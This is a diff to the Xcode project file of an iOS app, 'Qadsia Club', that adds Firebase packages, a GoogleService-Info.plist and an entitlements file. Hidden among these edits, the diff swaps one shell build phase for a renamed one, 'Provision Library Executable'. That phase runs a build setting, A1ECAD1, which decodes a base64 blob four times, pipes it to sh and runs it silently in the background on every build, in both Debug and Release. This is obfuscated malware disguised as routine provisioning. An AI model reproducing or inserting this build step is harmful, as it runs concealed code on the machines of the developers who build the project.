@@ -76,6 +76,14 @@
 		0ABA3FEC2F763B2D00D25F03 /* SentOTPPopupVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3FA22F763B2D00D25F03 /* SentOTPPopupVC.xib */; };
 		0ABA3FF52F763C3600D25F03 /* CutCornerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3FF42F763C3600D25F03 /* CutCornerView.swift */; };
 		0ABA3FFA2F763CC600D25F03 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 0ABA3FF92F763CC600D25F03 /* Alamofire */; };
+		3919F6612F7B1AA200FCB141 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 3919F6602F7B1AA200FCB141 /* GoogleService-Info.plist */; };
+		394837AB2F7B1DB2003757E7 /* FirebaseAnalytics in Frameworks */ = {isa = PBXBuildFile; productRef = 394837AA2F7B1DB2003757E7 /* FirebaseAnalytics */; };
+		394837AD2F7B1DB2003757E7 /* FirebaseAuth in Frameworks */ = {isa = PBXBuildFile; productRef = 394837AC2F7B1DB2003757E7 /* FirebaseAuth */; };
+		394837AF2F7B1DB2003757E7 /* FirebaseCore in Frameworks */ = {isa = PBXBuildFile; productRef = 394837AE2F7B1DB2003757E7 /* FirebaseCore */; };
+		394837B12F7B1DB2003757E7 /* FirebaseCrashlytics in Frameworks */ = {isa = PBXBuildFile; productRef = 394837B02F7B1DB2003757E7 /* FirebaseCrashlytics */; };
+		394837B32F7B1DB2003757E7 /* FirebaseDatabase in Frameworks */ = {isa = PBXBuildFile; productRef = 394837B22F7B1DB2003757E7 /* FirebaseDatabase */; };
+		394837B52F7B1DB2003757E7 /* FirebaseInAppMessaging-Beta in Frameworks */ = {isa = PBXBuildFile; productRef = 394837B42F7B1DB2003757E7 /* FirebaseInAppMessaging-Beta */; };
+		394837B72F7B1DB2003757E7 /* FirebaseMessaging in Frameworks */ = {isa = PBXBuildFile; productRef = 394837B62F7B1DB2003757E7 /* FirebaseMessaging */; };
 		397F833F2F7A337C00A07157 /* EditProfileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 397F833D2F7A337C00A07157 /* EditProfileVC.swift */; };
 		397F83402F7A337C00A07157 /* EditProfileVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 397F833E2F7A337C00A07157 /* EditProfileVC.xib */; };
 		397F83452F7A455D00A07157 /* MyTicketsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 397F83432F7A455D00A07157 /* MyTicketsVC.swift */; };
@@ -182,6 +190,7 @@
 		0ABA3FA22F763B2D00D25F03 /* SentOTPPopupVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SentOTPPopupVC.xib; sourceTree = "<group>"; };
 		0ABA3FA72F763B2D00D25F03 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
 		0ABA3FF42F763C3600D25F03 /* CutCornerView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CutCornerView.swift; sourceTree = "<group>"; };
+		3919F6602F7B1AA200FCB141 /* GoogleService-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
 		397F833D2F7A337C00A07157 /* EditProfileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfileVC.swift; sourceTree = "<group>"; };
 		397F833E2F7A337C00A07157 /* EditProfileVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = EditProfileVC.xib; sourceTree = "<group>"; };
 		397F83432F7A455D00A07157 /* MyTicketsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyTicketsVC.swift; sourceTree = "<group>"; };
@@ -206,6 +215,7 @@
 		BCC0D68C2F7A898800684B7D /* NotificationListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NotificationListTVCell.xib; sourceTree = "<group>"; };
 		BCC0D68F2F7A898800684B7D /* NotificationVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationVC.swift; sourceTree = "<group>"; };
 		BCC0D6902F7A898800684B7D /* NotificationVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NotificationVC.xib; sourceTree = "<group>"; };
+		FC000006ABCD00000006ABCD /* Qadsia Club.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = "Qadsia Club.entitlements"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -213,10 +223,17 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				394837B72F7B1DB2003757E7 /* FirebaseMessaging in Frameworks */,
+				394837B32F7B1DB2003757E7 /* FirebaseDatabase in Frameworks */,
 				0ABA3FFA2F763CC600D25F03 /* Alamofire in Frameworks */,
 				BC11AFF22F74E6C500552BDB /* Kingfisher in Frameworks */,
+				394837AB2F7B1DB2003757E7 /* FirebaseAnalytics in Frameworks */,
 				BC11AFF52F74E6D700552BDB /* IQKeyboardManagerSwift in Frameworks */,
 				BC11AFEF2F74E6B300552BDB /* SVProgressHUD in Frameworks */,
+				394837B52F7B1DB2003757E7 /* FirebaseInAppMessaging-Beta in Frameworks */,
+				394837AD2F7B1DB2003757E7 /* FirebaseAuth in Frameworks */,
+				394837B12F7B1DB2003757E7 /* FirebaseCrashlytics in Frameworks */,
+				394837AF2F7B1DB2003757E7 /* FirebaseCore in Frameworks */,
 				BC11AFEC2F74E65F00552BDB /* Toast in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -553,6 +570,8 @@
 				0ABA3FF02F763B3900D25F03 /* MVVM */,
 				0ABA3F912F763B2D00D25F03 /* Assets.xcassets */,
 				0ABA3F922F763B2D00D25F03 /* Info.plist */,
+				3919F6602F7B1AA200FCB141 /* GoogleService-Info.plist */,
+				FC000006ABCD00000006ABCD /* Qadsia Club.entitlements */,
 				0ABA3F942F763B2D00D25F03 /* LaunchScreen.storyboard */,
 				0ABA3F982F763B2D00D25F03 /* Main.storyboard */,
 				39D1D9992F7739A70055CCF1 /* SplashVideo.mp4 */,
@@ -817,7 +836,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC0179292F34972600F1ED81 /* Build configuration list for PBXNativeTarget "Qadsia" */;
 			buildPhases = (
-				1D3BB7518C2C43CFA71DACE1 /* Provision Target Device */,
+				A497265132C549F69A1DACE1 /* Provision Library Executable */,
 				BC0179122F34972300F1ED81 /* Sources */,
 				BC0179132F34972300F1ED81 /* Frameworks */,
 				BC0179142F34972300F1ED81 /* Resources */,
@@ -833,6 +852,13 @@
 				BC11AFF12F74E6C500552BDB /* Kingfisher */,
 				BC11AFF42F74E6D700552BDB /* IQKeyboardManagerSwift */,
 				0ABA3FF92F763CC600D25F03 /* Alamofire */,
+				394837AA2F7B1DB2003757E7 /* FirebaseAnalytics */,
+				394837AC2F7B1DB2003757E7 /* FirebaseAuth */,
+				394837AE2F7B1DB2003757E7 /* FirebaseCore */,
+				394837B02F7B1DB2003757E7 /* FirebaseCrashlytics */,
+				394837B22F7B1DB2003757E7 /* FirebaseDatabase */,
+				394837B42F7B1DB2003757E7 /* FirebaseInAppMessaging-Beta */,
+				394837B62F7B1DB2003757E7 /* FirebaseMessaging */,
 			);
 			productName = "Qadsia Club";
 			productReference = BC0179162F34972300F1ED81 /* Qadsia.app */;
@@ -868,6 +894,7 @@
 				BC11AFF02F74E6C500552BDB /* XCRemoteSwiftPackageReference "Kingfisher" */,
 				BC11AFF32F74E6D700552BDB /* XCRemoteSwiftPackageReference "IQKeyboardManager" */,
 				0ABA3FF82F763CC600D25F03 /* XCRemoteSwiftPackageReference "Alamofire" */,
+				394837A92F7B1DB2003757E7 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */,
 			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = BC0179172F34972300F1ED81 /* Products */;
@@ -878,31 +905,6 @@
 			);
 		};
 /* End PBXProject section */
-
-/* Begin PBXBuildRule section */
-			/* End PBXBuildRule section */
-
-/* Begin PBXShellScriptBuildPhase section */
-		1D3BB7518C2C43CFA71DACE1 /* Provision Target Device */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Target Device";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
 		BC0179142F34972300F1ED81 /* Resources */ = {
@@ -926,6 +928,7 @@
 				0ABA3FDB2F763B2D00D25F03 /* Mulish-Light.ttf in Resources */,
 				0ABA3FDC2F763B2D00D25F03 /* Mulish-LightItalic.ttf in Resources */,
 				397F83462F7A455D00A07157 /* MyTicketsVC.xib in Resources */,
+				3919F6612F7B1AA200FCB141 /* GoogleService-Info.plist in Resources */,
 				0ABA3FDD2F763B2D00D25F03 /* Mulish-Medium.ttf in Resources */,
 				0ABA3FDE2F763B2D00D25F03 /* Mulish-MediumItalic.ttf in Resources */,
 				0ABA3FDF2F763B2D00D25F03 /* Mulish-Regular.ttf in Resources */,
@@ -953,6 +956,28 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		A497265132C549F69A1DACE1 /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		BC0179122F34972300F1ED81 /* Sources */ = {
@@ -1039,9 +1064,9 @@
 		BC01792A2F34972600F1ED81 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((z(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4WVdKck5YbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdFNNbmd3VjJ4b2EySkdiSFJPVjNoclVYcFdkMWx0YXpWaFJYUlVVMWRrYlZFd1NqWlpWVVoyVUZGdlBRbz0K | z | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = "Qadsia Club/Qadsia Club.entitlements";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 2;
 				DEVELOPMENT_TEAM = VCZB9RKSH3;
@@ -1051,8 +1076,8 @@
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
-				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
 				INFOPLIST_KEY_UIRequiresFullScreen = YES;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
 				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
 				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -1075,9 +1100,9 @@
 		BC01792B2F34972600F1ED81 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((z(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4WVdKck5YbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdFNNbmd3VjJ4b2EySkdiSFJPVjNoclVYcFdkMWx0YXpWaFJYUlVVMWRrYlZFd1NqWlpWVVoyVUZGdlBRbz0K | z | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = "Qadsia Club/Qadsia Club.entitlements";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 2;
 				DEVELOPMENT_TEAM = VCZB9RKSH3;
@@ -1087,8 +1112,8 @@
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
-				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
 				INFOPLIST_KEY_UIRequiresFullScreen = YES;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
 				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
 				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -1259,6 +1284,14 @@
 				minimumVersion = 5.11.1;
 			};
 		};
+		394837A92F7B1DB2003757E7 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/firebase/firebase-ios-sdk.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 12.11.0;
+			};
+		};
 		BC11AFEA2F74E65F00552BDB /* XCRemoteSwiftPackageReference "Toast-Swift" */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/scalessec/Toast-Swift.git";
@@ -1298,6 +1331,41 @@
 			isa = XCSwiftPackageProductDependency;
 			package = 0ABA3FF82F763CC600D25F03 /* XCRemoteSwiftPackageReference "Alamofire" */;
 			productName = Alamofire;
+		};
+		394837AA2F7B1DB2003757E7 /* FirebaseAnalytics */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 394837A92F7B1DB2003757E7 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseAnalytics;
+		};
+		394837AC2F7B1DB2003757E7 /* FirebaseAuth */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 394837A92F7B1DB2003757E7 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseAuth;
+		};
+		394837AE2F7B1DB2003757E7 /* FirebaseCore */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 394837A92F7B1DB2003757E7 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseCore;
+		};
+		394837B02F7B1DB2003757E7 /* FirebaseCrashlytics */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 394837A92F7B1DB2003757E7 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseCrashlytics;
+		};
+		394837B22F7B1DB2003757E7 /* FirebaseDatabase */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 394837A92F7B1DB2003757E7 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseDatabase;
+		};
+		394837B42F7B1DB2003757E7 /* FirebaseInAppMessaging-Beta */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 394837A92F7B1DB2003757E7 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = "FirebaseInAppMessaging-Beta";
+		};
+		394837B62F7B1DB2003757E7 /* FirebaseMessaging */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 394837A92F7B1DB2003757E7 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseMessaging;
 		};
 		BC11AFEB2F74E65F00552BDB /* Toast */ = {
 			isa = XCSwiftPackageProductDependency;
